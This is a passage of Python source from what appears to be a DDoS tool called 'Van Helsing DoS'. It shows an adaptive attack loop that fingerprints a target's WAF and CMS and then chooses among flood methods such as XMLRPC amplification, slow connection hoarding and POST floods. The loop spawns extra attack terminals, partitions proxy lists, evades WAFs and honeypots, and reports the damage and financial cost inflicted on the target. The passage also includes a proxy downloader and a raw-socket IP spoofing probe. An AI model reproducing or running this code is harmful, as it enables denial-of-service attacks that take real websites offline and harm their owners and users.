        if intel["total_executions"] == 35 and not intel.get("legion_mode_activated"):
            intel["legion_mode_activated"] = True
            try:
                import sys, os
                from urllib.parse import urlparse
                # Only run if we are the main Chaos instance, not a spawned child
                if "legion_slave_ignore" not in sys.argv:
                    print(f"\n{bcolors.OKGREEN}[CHAOS LEGION] Deep Recon Complete. Establishing Multi-Terminal Assault...{bcolors.RESET}")
                    
                    target_url = f"{self._target.scheme}://{self._target.authority}"
                    
                    # Analyze gathered intel to select the most devastating orthogonal methods
                    legion_methods = []
                    
                    waf = intel.get("waf_type", "")
                    cms = intel.get("cms_type", "")
                    
                    if waf in ("cloudflare", "fastly", "ddos-guard", "akamai"):
                        legion_methods = ["STEALTH_JA3", "SLOW_V2", "PPS"]
                    elif cms == "wordpress":
                        legion_methods = ["XMLRPC_AMP", "WP_SEARCH", "POST_DYN", "SLOW_V2"]
                    elif cms in ("laravel", "codeigniter", "livewire") or "ci_session" in str(intel.get("infra_map")):
                        legion_methods = ["POST_DYN", "STRESS", "SLOW_V2", "PPS"]
                    elif intel.get("infra_map", {}).get("vercel") or intel.get("infra_map", {}).get("nuxt"):
                        legion_methods = ["STEALTH_JA3", "SLOW_V2", "POST_DYN"]
                    elif intel.get("server_type") == "litespeed":
                        legion_methods = ["STRESS", "SLOW_V2", "POST_DYN"]
                    else:
                        legion_methods = ["POST_DYN", "SLOW_V2", "STRESS"]
                        
                    # Limit to 3 extra windows to prevent system crash
                    legion_methods = legion_methods[:3]
                    
                    # [V36] Proxy Partitioner - Prevent Socket Exhaustion by splitting pool
                    proxy_files = []
                    if len(PROXY_LIST) > 100:
                        chunk_size = len(PROXY_LIST) // (len(legion_methods) + 1)
                        for i, m in enumerate(legion_methods):
                            p_file = f"proxy_legion_{i+1}.txt"
                            start_idx = (i + 1) * chunk_size
                            end_idx = start_idx + chunk_size
                            partition = PROXY_LIST[start_idx:end_idx]
                            
                            with open(p_file, "w") as f:
                                for p in partition:
                                    f.write(f"{p.ip}:{p.port}\n")
                            proxy_files.append(p_file)
                    else:
                        proxy_files = ["proxy.txt"] * len(legion_methods)
                    
                    import threading
                    def spawn_legion():
                        for idx, m in enumerate(legion_methods):
                            title = f"Van Helsing DoS Legion Slave - {m}"
                            p_file = proxy_files[idx]
                            # Pass 'legion_slave_ignore' to prevent infinite recursive terminal popping
                            cmd = f'start "{title}" cmd /k "{sys.executable} start.py {m} {target_url} 5 100 {p_file} 5 800 legion_slave_ignore"'
                            print(f"{bcolors.OKCYAN} -> Launching Legion Battalion: {m} (Proxy Part: {p_file}){bcolors.RESET}")
                            os.system(cmd)
                            time.sleep(1)
                            
                    threading.Thread(target=spawn_legion, daemon=True).start()
            except Exception as e:
                pass
            
        # Apply timing jitter (human-like random delay)
        jitter = intel.get("jitter_ms", 0)
        if jitter > 0:
            sleep(jitter / 1000.0)
        
        # Save learned intelligence periodically (every 500 executions)
        if intel["total_executions"] > 0 and intel["total_executions"] % 500 == 0:
            intel["saved_to_disk"] = False  # Allow resaving
            self._chaos_save_memory()
        
        # Inject decoy traffic every 15-25 executions to camouflage patterns
        intel["decoy_interval"] += 1
        if intel["decoy_interval"] >= randint(15, 25):
            intel["decoy_interval"] = 0
            self._chaos_decoy()
        
        # Phase 2: STRATEGIC PLAN (recalculated every call with live data)
        weights = self._chaos_plan()
        
        # Phase 2.4: ANOMALY COOLDOWN ENFORCEMENT
        if intel.get("shadow_protocol_active"):
            # SHADOW PROTOCOL: Absolute zero noise.
            for m in weights:
                weights[m] = 0
            weights["STEALTH_JA3"] = 100
            weights["SLOW_V2"] = 50
        elif intel.get("honeypot_detected"):
            # DUMB BOT PROTOCOL: Feed false data to security researchers
            for m in weights: weights[m] = 0
            weights["GET"] = 100 # Look like a basic script kiddy
            intel["q_epsilon"] = 0.0 # Stop learning
        elif intel.get("stealth_cooldown", 0) > 0:
            # We are too hot. WAF is watching closely. Suppress noisy attacks.
            for m in weights:
                if m not in ("STEALTH_JA3", "SLOW_V2", "COOKIE", "BOT"):
                    weights[m] = 0
            weights["STEALTH_JA3"] = max(weights.get("STEALTH_JA3", 0), 100)

        # Phase 2.5: DIVERSITY ENFORCEMENT
        weights = self._chaos_force_diversity(weights, {
            "GET": 1, "POST": 1, "STRESS": 1, "PPS": 1, "DYN": 1,
            "POST_DYN": 1, "SLOW_V2": 1, "XMLRPC_AMP": 1, "WP_SEARCH": 1,
            "BOT": 1, "COOKIE": 1, "STEALTH_JA3": 1,
        })
        
        # Phase 2.5.2: SIEGE DOCTRINE WEIGHT MODULATION
        siege = intel.get("siege_phase", "RECON")
        if siege == "RECON":
            # Light probing only
            for m in weights:
                if m not in ("STEALTH_JA3", "BOT", "COOKIE", "GET"):
                    weights[m] = max(weights[m] // 3, 1)
        elif siege == "SOFTEN":
            # Mix of stealth and moderate force
            weights["SLOW_V2"] = max(weights.get("SLOW_V2", 0), 60)
            weights["STEALTH_JA3"] = max(weights.get("STEALTH_JA3", 0), 50)
        elif siege == "BREACH":
            # Full commitment to highest-damage methods
            if intel.get("best_method") and intel["best_method"] in weights:
                weights[intel["best_method"]] = max(weights[intel["best_method"]], 150)
            weights["STRESS"] = max(weights.get("STRESS", 0), 80)
        elif siege == "PILLAGE":
            # Target is down. Use minimum force to keep it down while conserving proxies.
            for m in weights:
                weights[m] = max(weights[m] // 4, 1)
            weights["SLOW_V2"] = 80  # Connection hoarding is cheapest
            weights["STEALTH_JA3"] = 40

        # Phase 2.5.3: CIRCADIAN RHYTHM MODULATION
        circadian = intel.get("circadian_profile", "DAYTIME")
        if circadian == "NIGHTTIME":
            # Off-hours: Suppress noisy methods. Blend with near-zero background traffic.
            for m in weights:
                if m not in ("STEALTH_JA3", "SLOW_V2"):
                    weights[m] = max(weights[m] // 3, 1)
        elif circadian == "PEAK_HOUR":
            # Rush hour: We can be louder because real traffic masks us
            for m in weights:
                weights[m] = int(weights[m] * 1.3)

        # Phase 2.5.5: MULTI-VECTOR PROTOCOL (Omni-Directional Strike)
        # Instead of 1 method, if WAF adapts, hit with 3 completely orthogonal methods simultaneously
        # Example: Hit CPU via WP_SEARCH, hit Memory via SLOW_V2, hit Bandwidth via POST_DYN
        if intel.get("waf_adapting") and not intel.get("multi_vector_active") and not intel.get("shadow_protocol_active"):
            intel["multi_vector_active"] = True
            for m in weights: weights[m] = 0
            
            # Form the orthogonal strike team
            combo = ["STEALTH_JA3", "SLOW_V2", "XMLRPC_AMP"] if intel.get("target_type") == "php" else ["STEALTH_JA3", "SLOW_V2", "POST_DYN"]
            for m in combo:
                if m in list(intel["efficiency_score"].keys()):
                    weights[m] = 100
                else: weights[m] = 50
                
            if int(REQUESTS_SENT) < 2500:
                print(f"{bcolors.FAIL}[CHAOS TACTICAL] WAF Adaptation detected. Launching OMNI-DIRECTIONAL MULTI-VECTOR strike.{bcolors.RESET}")
                
        # Phase 2.6: Reinforcement Learning (Q-Table) Action Injection - Epsilon Greedy
        state = intel.get("current_state", "PROBE")
        q = intel.get("q_table", {})
        
        # Decay Epsilon (Exploration becomes Exploitation over time)
        if intel["total_executions"] % 100 == 0:
            intel["q_epsilon"] = max(intel["q_epsilon"] * 0.95, 0.05)
            
        if state in q and q[state]:
            # Exploit: Pick best action from Q-Table
            if randint(1, 100) > (intel["q_epsilon"] * 100):
                best_q_method = max(q[state], key=q[state].get)
                if q[state][best_q_method] > 0 and best_q_method in weights:
                    # ML RL Agent overrides decision and strongly suggests this method
                    weights[best_q_method] = max(weights.get(best_q_method, 0) * 3, 50)
                    if int(REQUESTS_SENT) < 2500 and intel["total_executions"] % 50 == 0:
                        pass # Quiet logging

        # Phase 3: EXECUTE with intelligent method selection
        method_map = {
            "GET": self.GET, "POST": self.POST, "STRESS": self.STRESS,
            "PPS": self.PPS, "DYN": self.DYN, "POST_DYN": self.POST_DYN,
            "SLOW_V2": self.SLOW_V2, "XMLRPC_AMP": self.XMLRPC_AMP,
            "WP_SEARCH": self.WP_SEARCH, "BOT": self.BOT, "COOKIE": self.COOKIES,
        }
        if HAS_TLS_CLIENT:
            method_map["STEALTH_JA3"] = self.STEALTH_JA3
        
        chosen_name = "GET"  # Fallback
        
        # === DECISION TREE ===
        # Priority 0: During REST wave, only fire stealth/decoy
        if wave_state == "REST" and randint(1, 3) <= 2:
            rest_pool = ["STEALTH_JA3", "SLOW_V2", "BOT"]
            for rp in rest_pool:
                if rp in method_map and weights.get(rp, 0) > 0:
                    chosen_name = rp
                    break
        
        # Priority 1: Execute combo chain if one is queued
        if chosen_name == "GET" and intel.get("combo_queue"):
            combo_method = intel["combo_queue"].pop(0)
            if combo_method in method_map and weights.get(combo_method, 0) > 0:
                chosen_name = combo_method
            else:
                intel["combo_queue"] = []  # Abort invalid combo
                
        # Priority 1.5: Multi-path targeting (use queued path+method pair)
        if chosen_name == "GET" and intel.get("multi_path_queue"):
            mp_path, mp_method = intel["multi_path_queue"].pop(0)
            if mp_method in method_map and weights.get(mp_method, 0) > 0:
                chosen_name = mp_method
                # Override the target path temporarily for this method
                if hasattr(self, 'crawled_paths') and mp_path not in (self.crawled_paths or []):
                    if not hasattr(self, 'crawled_paths') or not self.crawled_paths:
                        self.crawled_paths = []
                    self.crawled_paths.insert(0, mp_path)
        
        # Priority 1.6: Try dynamic combo (generated from best performers)
        if chosen_name == "GET" and not intel.get("combo_queue") and intel["total_executions"] % randint(20, 30) == 0:
            dynamic_combo = self._chaos_build_dynamic_combo()
            if dynamic_combo:
                intel["combo_queue"] = dynamic_combo
                chosen_name = intel["combo_queue"].pop(0)
                if chosen_name not in method_map or weights.get(chosen_name, 0) <= 0:
                    chosen_name = "GET"
                
        # Priority 2: Emergency evasion - pick least-used method
        if chosen_name == "GET" and intel.get("emergency_evasion"):
            # Find method with fewest total attempts
            least_used = None
            least_count = float('inf')
            for name, w in weights.items():
                if w > 0 and name in method_map:
                    attempts = len(intel.get("success_history", {}).get(name, []))
                    if attempts < least_count:
                        least_count = attempts
                        least_used = name
            if least_used:
                chosen_name = least_used
                
        # Priority 2.5: Hot Streak - Ride a winning method (30% chance)
        if chosen_name == "GET" and intel.get("hot_streak_method"):
            hot = intel["hot_streak_method"]
            if hot in method_map and weights.get(hot, 0) > 0 and randint(1, 100) <= 30:
                chosen_name = hot
        
        # Priority 3: Exploit known weakpoint (20% of the time in ASSAULT+ phases)
        if chosen_name == "GET" and intel.get("target_weakpoint") and intel["phase"] in ("ASSAULT", "FINISH"):
            if randint(1, 5) <= 1:  # 20% chance to exploit weakpoint directly
                wp = intel["target_weakpoint"]
                if wp in method_map and weights.get(wp, 0) > 0:
                    chosen_name = wp
        
        # Priority 4: Normal weighted roulette
        if chosen_name == "GET":
            active_pool = [(name, w) for name, w in weights.items() if w > 0 and name in method_map]
            total_weight = sum(w for _, w in active_pool)
            
            if total_weight > 0:
                r = randint(1, total_weight)
                upto = 0
                for name, weight in active_pool:
                    if upto + weight >= r:
                        chosen_name = name
                        break
                    upto += weight
        
        chosen_func = method_map.get(chosen_name, self.GET)
        
        # Update method tracking for anti-pattern
        intel["last_method"] = chosen_name
        if "last_3_methods" not in intel:
            intel["last_3_methods"] = []
        intel["last_3_methods"].append(chosen_name)
        if len(intel["last_3_methods"]) > 3:
            intel["last_3_methods"] = intel["last_3_methods"][-3:]
        
        intel["burst_counter"] += 1
        
        # Track exploration + diversity data
        if chosen_name not in intel.get("methods_tried_count", {}):
            intel["methods_tried_count"][chosen_name] = 0
        intel["methods_tried_count"][chosen_name] += 1
        self._chaos_track_diversity(chosen_name)
        
        # Track pre-execution state for observation
        pre_burned = len(BURNED_PROXIES)
        pre_errors = int(ERROR_COUNT)
        pre_requests = int(REQUESTS_SENT)
        
        # Execute the chosen attack vector
        try:
            chosen_func()
            
            # Phase 4: OBSERVE outcomes
            post_burned = len(BURNED_PROXIES)
            post_errors = int(ERROR_COUNT)
            post_requests = int(REQUESTS_SENT)
            
            got_blocked = post_burned > pre_burned
            got_errors = post_errors > pre_errors + 2
            got_5xx = False
            if post_requests == pre_requests and post_errors > pre_errors:
                got_5xx = True
            
            # Phase 5: ADAPT with reinforcement learning
            if got_blocked or got_errors:
                self._chaos_learn(chosen_name, False, got_5xx)
                if got_5xx:
                    self._chaos_log_event("5XX", f"{chosen_name} triggered server error")
                if got_blocked:
                    self._chaos_log_event("BLOCKED", f"{chosen_name} was blocked by WAF")
                # Phase 6: RETRY ESCALATION - If method failed, try stronger variant
                if got_blocked and intel["phase"] in ("ASSAULT", "FINISH"):
                    self._chaos_retry_escalate(chosen_name, method_map)
            else:
                self._chaos_learn(chosen_name, True, got_5xx)
                
            # Periodic status report (every 200 executions)
            if intel["total_executions"] % 200 == 0 and intel["total_executions"] > 0:
                elapsed = int(time() - intel["attack_start_time"])
                
                # Target health indicator (via External IP Probe)
                ext_status = intel.get("ext_health_status", "PENDING")
                if intel.get("target_is_down"):
                    health_indicator = f"{bcolors.OKGREEN}DOWN - TARGET ELIMINATED (ExtProbe: {ext_status}){bcolors.RESET}"
                elif intel.get("target_getting_weaker"):
                    health_indicator = f"{bcolors.WARNING}WEAKENING (ExtProbe: {ext_status}){bcolors.RESET}"
                else:
                    health_indicator = f"{bcolors.FAIL}HOLDING (ExtProbe: {ext_status}){bcolors.RESET}"
                    
                # WAF status
                waf_status = f"{bcolors.FAIL}ADAPTING - Counter-measures active{bcolors.RESET}" if intel.get("waf_adapting") else f"{bcolors.OKGREEN}Stable{bcolors.RESET}"
                
                print(f"")
                print(f"{bcolors.OKCYAN}================================================================{bcolors.RESET}")
                print(f"{bcolors.OKCYAN}  [CHAOS V14 BATTLEGROUND STATUS]{bcolors.RESET}")
                print(f"{bcolors.OKCYAN}================================================================{bcolors.RESET}")
                kc = intel.get("kill_chain_phase", "?")
                kc_colors = {"RECON": bcolors.OKCYAN, "PROBE": bcolors.OKBLUE, "WEAKEN": bcolors.WARNING, 
                             "BREACH": bcolors.FAIL, "OVERWHELM": f"{bcolors.FAIL}{bcolors.BOLD}", "SUSTAIN_KILL": bcolors.OKGREEN}
                kc_color = kc_colors.get(kc, bcolors.RESET)
                print(f"  Kill Chain  : {kc_color}{kc}{bcolors.RESET} | Obj: {intel.get('kill_chain_objective', '...')[:50]}")
                print(f"  Phase       : {bcolors.BOLD}{intel['phase']}{bcolors.RESET} | Executed: {intel['total_executions']} | Time: {elapsed}s")
                # TTD Prediction
                ttd = intel.get("predicted_ttd")
                if ttd is not None:
                    if ttd < 60:
                        print(f"  Predicted   : {bcolors.OKGREEN}TARGET DOWN IN ~{ttd}s{bcolors.RESET}")
                    elif ttd < 300:
                        print(f"  Predicted   : {bcolors.WARNING}~{ttd//60}m {ttd%60}s to collapse{bcolors.RESET}")
                    else:
                        print(f"  Predicted   : {bcolors.FAIL}~{ttd//60}m to collapse (resilient target){bcolors.RESET}")
                # Infrastructure map
                backend = intel.get("backend_lang", "?")
                framework = intel.get("backend_framework", "")
                resource = intel.get("resource_target", "auto")
                cog = intel.get("cognitive_state", "LEARNING")
                cog_colors = {"LEARNING": bcolors.OKCYAN, "EXPLOITING": bcolors.WARNING, "ADAPTING": bcolors.OKBLUE, "MASTERING": f"{bcolors.OKGREEN}{bcolors.BOLD}"}
                print(f"  Backend     : {backend}{(' / ' + framework) if framework else ''} | Target Resource: {resource}")
                print(f"  AI State    : {cog_colors.get(cog, '')}{cog}{bcolors.RESET} (Gen {intel.get('generation', 0)})")
                slope = intel.get("latency_trend_slope", 0)
                if slope < -50:
                    print(f"  Recovery    : {bcolors.FAIL}TARGET RECOVERING! (slope: {int(slope)}){bcolors.RESET}")
                elif slope > 100:
                    print(f"  Trend       : {bcolors.OKGREEN}Latency rising fast (slope: +{int(slope)}){bcolors.RESET}")
                print(f"  Target HP   : {health_indicator}")
                cooldown_str = f" {bcolors.WARNING}[COOLDOWN ACTIVE]{bcolors.RESET}" if intel.get("stealth_cooldown", 0) > 0 else ""
                print(f"  WAF Status  : {waf_status} | Anomaly: {intel.get('anomaly_score', 0)}/100{cooldown_str}")
                print(f"  Best Method : {bcolors.OKGREEN}{intel.get('best_method', 'Calibrating...')}{bcolors.RESET}")
                print(f"  Weakpoint   : {bcolors.WARNING}{intel.get('target_weakpoint', 'Scanning...')}{bcolors.RESET}")
                print(f"  Burned IPs  : {len(BURNED_PROXIES)}")
                # Show response time trend
                hp = intel.get("health_history", [])
                if hp:
                    avg_rt = sum(hp[-5:]) / len(hp[-5:])
                    trend = "RISING" if len(hp) >= 2 and hp[-1] > hp[-2] else "STABLE"
                    print(f"  Latency     : {int(avg_rt)}ms ({trend})")
                eff_str = " | ".join([f"{k}:{v:.0%}" for k, v in sorted(intel.get("efficiency_score", {}).items(), key=lambda x: -x[1])[:5]])
                if eff_str:
                    print(f"  Efficiency  : {eff_str}")
                # Damage assessment
                dmg = self._chaos_calculate_damage() if hasattr(self, '_chaos_calculate_damage') else 0
                if dmg > 500:
                    dmg_str = f"{bcolors.OKGREEN}CRITICAL ({dmg}){bcolors.RESET}"
                elif dmg > 200:
                    dmg_str = f"{bcolors.WARNING}HEAVY ({dmg}){bcolors.RESET}"
                elif dmg > 50:
                    dmg_str = f"{bcolors.OKCYAN}MODERATE ({dmg}){bcolors.RESET}"
                else:
                    dmg_str = f"LIGHT ({dmg})"
                # Bandwidth math
                bw_kb = intel.get("bandwidth_kb", 0)
                bw_str = f"{bw_kb / 1024:.2f} MB" if bw_kb < 1024 else f"{bw_kb / 1024 / 1024:.2f} GB"
                ml_status = f"{bcolors.OKGREEN}ACTIVE{bcolors.RESET}" if intel.get("ml_predictions_enabled") else f"{bcolors.WARNING}TRAINING{bcolors.RESET}"
                
                print(f"  Damage Dealt: {dmg_str} | Wasted CPU: {intel.get('wasted_server_cpu', 0)} cycles")
                print(f"  Bandwidth   : {bcolors.OKCYAN}{bw_str}{bcolors.RESET} of target data traffic exhausted")
                q_size = sum(len(actions) for actions in intel.get("q_table", {}).values())
                eps = intel.get("q_epsilon", 0.4) * 100
                js_status = "ACTIVE" if intel.get("playwright_active") else "STANDBY"
                js_passed = intel.get("js_challenges_passed", 0)
                print(f"  ML Predictor: {ml_status} | RL Q-Table States: {q_size} (Exploration: {eps:.1f}%)")
                if intel.get("playwright_active") or js_passed > 0:
                    print(f"  JS Engine   : {bcolors.OKGREEN}{js_status}{bcolors.RESET} | Solved Tokens: {js_passed}")
                shadow_str = f"{bcolors.FAIL}ENGAGED{bcolors.RESET}" if intel.get("shadow_protocol_active") else "Standby"
                nodes = intel.get("botnet_nodes_simulated", 0)
                asn = intel.get("asn_diversity_score", 0)
                if nodes > 0:
                    print(f"  Botnet      : {nodes} Nodes Mimicked | ASN Diversity: {asn} subnets")
                    print(f"  Protocol    : Shadow Phase: {shadow_str} | WAF Bypass Vectors: Synchronized")
                
                edge = intel.get("geo_edge_nodo", "UNKNOWN")
                mutz = intel.get("zero_day_mutations_sent", 0)
                if edge != "UNKNOWN" or mutz > 0:
                    print(f"  Cyber War   : Geo-Edge: {bcolors.OKBLUE}[{edge}]{bcolors.RESET} | Zero-Day Mutations Fired: {mutz} (DPI Exhaustion)")
                
                gti = "SYNCED" if intel.get("gti_match_score") > 0 else "LEARNING"
                thd = intel.get("adaptive_threads", 0)
                print(f"  GTI Core    : Global Threat Intel: {bcolors.OKGREEN}{gti}{bcolors.RESET} | Active Swarm Size: {thd} units (Auto-Scaled)")
                if intel.get("honeypot_detected"):
                    print(f"  {bcolors.FAIL}>> WARNING: HONEYPOT DETECTED. Executing counter-intel dumb protocols. <<{bcolors.RESET}")
                
                mv_str = f"{bcolors.WARNING}ENGAGED{bcolors.RESET}" if intel.get("multi_vector_active") else "Standby"
                qs_str = f"{bcolors.OKCYAN}SHIFTING{bcolors.RESET}" if intel.get("quantum_state_active") else "Stable"
                auth = len(intel.get("topology_mesh", {}).get("auth_endpoints", []))
                apis = len(intel.get("topology_mesh", {}).get("api_endpoints", []))
                print(f"  Tactical    : Multi-Vector: {mv_str} | Quantum IP State: {qs_str} | Microservices Mapped: Auth({auth}) API({apis})")
                
                cache_dm = intel.get("poisoned_cache_hits", 0)
                dns_status = "Root Bypassed" if intel.get("dead_drop_dns") else "Standard"
                synapses = sum(len(dest) for dest in intel.get("neural_synapses", {}).values())
                print(f"  Apex Tech   : DNS Resolution: {dns_status} | Neural Synapses: {synapses} paths | Cache Poisonings: {cache_dm}")
                
                siege = intel.get("siege_phase", "RECON")
                siege_colors = {"RECON": bcolors.OKCYAN, "SOFTEN": bcolors.WARNING, "BREACH": bcolors.FAIL, "SUSTAIN": bcolors.OKBLUE, "PILLAGE": bcolors.OKGREEN}
                s_col = siege_colors.get(siege, bcolors.RESET)
                elapsed_m = intel.get("total_attack_duration_sec", 0) // 60
                elapsed_s = intel.get("total_attack_duration_sec", 0) % 60
                financial = intel.get("estimated_financial_damage_usd", 0)
                pool_pct = intel.get("connection_pool_pressure", 0)
                circ = intel.get("circadian_profile", "DAYTIME")
                ssl_cn = intel.get("ssl_cert_cn", "N/A")
                print(f"  Siege Phase : {s_col}{siege}{bcolors.RESET} | Elapsed: {elapsed_m}m {elapsed_s}s | Circadian: {circ}")
                print(f"  Financial   : Est. Target Costs: {bcolors.FAIL}${financial:.4f} USD{bcolors.RESET} (Egress + Compute + WAF)")
                print(f"  Conn Pool   : {pool_pct}% of target's pool exhausted | SSL CN: {ssl_cn}")
                infra = intel.get("infra_map", {})
                v32_mods = []
                if infra.get("litespeed_cache_bypass"): v32_mods.append("LSCache-Bypass")
                if infra.get("wp_json_mapped"): v32_mods.append("WP-JSON-Exploit")
                if infra.get("gov_heuristics_applied"): v32_mods.append("GovID-Intel")
                if intel.get("harvested_cookies", {}).get("XSRF-TOKEN"): v32_mods.append("XSRF-Hijack")
                xmlrpc_s = intel.get("infra_map", {}).get("xmlrpc_status", "?")
                if xmlrpc_s != "?": v32_mods.append(f"XMLRPC:{xmlrpc_s}")
                if intel.get("infra_map", {}).get("livewire"): v32_mods.append("Livewire-Exploit")
                if intel.get("infra_map", {}).get("wp_plugins_scanned"): v32_mods.append("WP-Plugins-Mapped")
                rl = intel.get("rate_limit_threshold")
                if rl: v32_mods.append(f"RateLimit:{rl}")
                page_kb = intel.get("page_weight_bytes", 0) // 1024
                if page_kb > 0: v32_mods.append(f"PageWt:{page_kb}KB")
                if intel.get("wp_cron_available"): v32_mods.append("WP-Cron-Exploit")
                if intel.get("login_endpoint"): v32_mods.append(f"LoginFlood:{intel['login_endpoint']}")
                evasion = intel.get("waf_evasion_score", 0)
                vectors = len([m for m,w in weights.items() if w > 20]) if 'weights' in dir() else 0
                if v32_mods:
                    print(f"  Field Intel : {bcolors.OKGREEN}{" | ".join(v32_mods)}{bcolors.RESET}")
                print(f"  Evasion     : WAF Bypass Score: {evasion}% | Attack Vectors Active: {vectors}")
                sessions = intel.get("session_exhaustion_count", 0)
                entropy = intel.get("entropy_score", 0.0)
                gen = intel.get("genetic_payload_gen", 0)
                smuggle = "ACTIVE" if intel.get("request_smuggling_active") else "N/A"
                err_pats = intel.get("server_error_patterns", [])
                print(f"  Deep Intel  : Sessions Exhausted: {sessions} | Entropy: {entropy:.2f} bits | Genetic Gen: {gen}")
                print(f"  Smuggling   : {smuggle} | Server Errors Caught: {err_pats[:3] if err_pats else 'None yet'}")
                infra_tags = []
                if intel.get("infra_map", {}).get("vercel"): infra_tags.append("Vercel-Edge")
                if intel.get("infra_map", {}).get("nuxtjs"): infra_tags.append("Nuxt-SSR")
                if intel.get("infra_map", {}).get("ci_detected"): infra_tags.append("CodeIgniter")
                if intel.get("infra_map", {}).get("caddy_proxy"): infra_tags.append("Caddy-Proxy")
                if intel.get("infra_map", {}).get("google_cloud"): infra_tags.append("Google-Cloud")
                if intel.get("infra_map", {}).get("env_exposed"): infra_tags.append("ENV-EXPOSED!")
                if intel.get("infra_map", {}).get("uni_heuristics_applied"): infra_tags.append("Univ-Profile")
                if infra_tags:
                    print(f"  Infra Map   : {bcolors.OKCYAN}{" | ".join(infra_tags)}{bcolors.RESET}")
                print(f"  Attack Rate : {intel.get('adaptive_rpc', 10)} RPC | Jitter: {intel.get('jitter_ms', 0)}ms")
                # Show WAF rules detected
                rules = intel.get("waf_rules_triggered", [])
                if rules:
                    print(f"  WAF Rules   : {bcolors.FAIL}{', '.join(rules[:5])}{bcolors.RESET}")
                cookies_count = len(intel.get("harvested_cookies", {}))
                if cookies_count:
                    print(f"  Cookies     : {cookies_count} harvested (trust level: HIGH)")
                hot = intel.get("hot_streak_method")
                if hot:
                    streak_len = intel.get("method_streaks", {}).get(hot, 0)
                    print(f"  Hot Streak  : {bcolors.OKGREEN}{hot} ({streak_len} consecutive wins!){bcolors.RESET}")
                diversity = intel.get("method_diversity_score", 0)
                total_by = intel.get("total_requests_by_method", {})
                if total_by:
                    top3 = sorted(total_by.items(), key=lambda x: -x[1])[:3]
                    usage_str = " | ".join([f"{m}:{c}" for m, c in top3])
                    print(f"  Diversity   : {diversity} unique methods | Top: {usage_str}")
                pulses = intel.get("pulse_count", 0)
                if pulses > 0:
                    print(f"  Swarm Sync  : {bcolors.FAIL}{pulses} synchronized multi-thread pulses fired{bcolors.RESET}")
                print(f"{bcolors.OKCYAN}================================================================{bcolors.RESET}")
                print(f"")
                
        except Exception:
            self._chaos_learn(chosen_name, False)
        
        # Auto-save memory every 500 executions
        if intel["total_executions"] % 500 == 0 and intel["total_executions"] > 0:
            self._chaos_save_memory()


class ProxyManager:

    @staticmethod
    def DownloadFromConfig(cf, Proxy_type: int) -> Set[Proxy]:
        providrs = [
            provider for provider in cf["proxy-providers"]
            if provider["type"] == Proxy_type or Proxy_type == 0
        ]
        logger.info(
            f"{bcolors.WARNING}Downloading Proxies from {bcolors.OKBLUE}%d{bcolors.WARNING} Providers{bcolors.RESET}" % len(
                providrs))
        proxes: Set[Proxy] = set()

        with ThreadPoolExecutor(len(providrs)) as executor:
            future_to_download = {
                executor.submit(
                    ProxyManager.download, provider,
                    ProxyType.stringToProxyType(str(provider["type"])))
                for provider in providrs
            }
            for future in as_completed(future_to_download):
                for pro in future.result():
                    proxes.add(pro)
        return proxes

    @staticmethod
    def download(provider, proxy_type: ProxyType) -> Set[Proxy]:
        logger.debug(
            f"{bcolors.WARNING}Proxies from (URL: {bcolors.OKBLUE}%s{bcolors.WARNING}, Type: {bcolors.OKBLUE}%s{bcolors.WARNING}, Timeout: {bcolors.OKBLUE}%d{bcolors.WARNING}){bcolors.RESET}" %
            (provider["url"], proxy_type.name, provider["timeout"]))
        proxes: Set[Proxy] = set()
        with suppress(TimeoutError, exceptions.ConnectionError,
                      exceptions.ReadTimeout):
            data = get(provider["url"], timeout=provider["timeout"]).text
            try:
                for proxy in ProxyUtiles.parseAllIPPort(
                        data.splitlines(), proxy_type):
                    proxes.add(proxy)
            except Exception as e:
                logger.error(f'Download Proxy Error: {(e.__str__() or e.__repr__())}')
        return proxes


class ToolsConsole:
    METHODS = {"INFO", "TSSRV", "CFIP", "DNS", "PING", "CHECK", "DSTAT"}

    @staticmethod
    def checkSpoofing():
        # [PHASE 4] Advanced BCP38 Detection Probe
        try:
            with socket(AF_INET, SOCK_RAW, IPPROTO_RAW) as s:
                s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
                # Build dummy raw packet with spoofed source 1.2.3.4
                packet = b'E\x00\x00(\x00\x00\x00\x00@\x06\x00\x00\x01\x02\x03\x04\x08\x08\x08\x08'
                s.sendto(packet, ('8.8.8.8', 80))
            return True
        except PermissionError:
            return False
        except OSError as e:
            # Operation not permitted or Network Unreachable for spoofed IP
            return False
        except: return False

    @staticmethod
    def checkRawSocket():
        with suppress(OSError):
            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP):
                return True
        return False

    @staticmethod
    def runConsole():
        cons = f"{gethostname()}@MHTools:~#"

        while 1:
            cmd = input(cons + " ").strip()
            if not cmd: continue
            if " " in cmd:
                cmd, args = cmd.split(" ", 1)

            cmd = cmd.upper()
            if cmd == "HELP":
                print("Tools:" + ", ".join(ToolsConsole.METHODS))
                print("Commands: HELP, CLEAR, BACK, EXIT")
                continue

            if {cmd} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                exit(-1)

            if cmd == "CLEAR":
                print("\033c")
                continue

            if not {cmd} & ToolsConsole.METHODS:
                print(f"{cmd} command not found")
                continue

            if cmd == "DSTAT":
                with suppress(KeyboardInterrupt):
                    ld = net_io_counters(pernic=False)

                    while True:
                        sleep(1)

                        od = ld
                        ld = net_io_counters(pernic=False)

                        t = [(last - now) for now, last in zip(od, ld)]

                        logger.info(
                            ("Bytes Sent %s\n"
                             "Bytes Received %s\n"
                             "Packets Sent %s\n"
                             "Packets Received %s\n"
                             "ErrIn %s\n"
                             "ErrOut %s\n"
                             "DropIn %s\n"
                             "DropOut %s\n"
                             "Cpu Usage %s\n"
                             "Memory %s\n") %
                            (Tools.humanbytes(t[0]), Tools.humanbytes(t[1]),
                             Tools.humanformat(t[2]), Tools.humanformat(t[3]),
                             t[4], t[5], t[6], t[7], str(cpu_percent()) + "%",
                             str(virtual_memory().percent) + "%"))
            if cmd in ["CFIP", "DNS"]:
                print("Soon")
                continue

            if cmd == "CHECK":
                while True:
                    with suppress(Exception):
                        domain = input(f'{cons}give-me-ipaddress# ')
                        if not domain: continue
                        if domain.upper() == "BACK": break
                        if domain.upper() == "CLEAR":
                            print("\033c")
                            continue
                        if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                            exit(-1)
                        if "/" not in domain: continue
                        logger.info("please wait ...")

                        with get(domain, timeout=20) as r:
                            logger.info(('status_code: %d\n'
                                         'status: %s') %
                                        (r.status_code, "ONLINE"
                                        if r.status_code <= 500 else "OFFLINE"))

            if cmd == "INFO":
                while True:
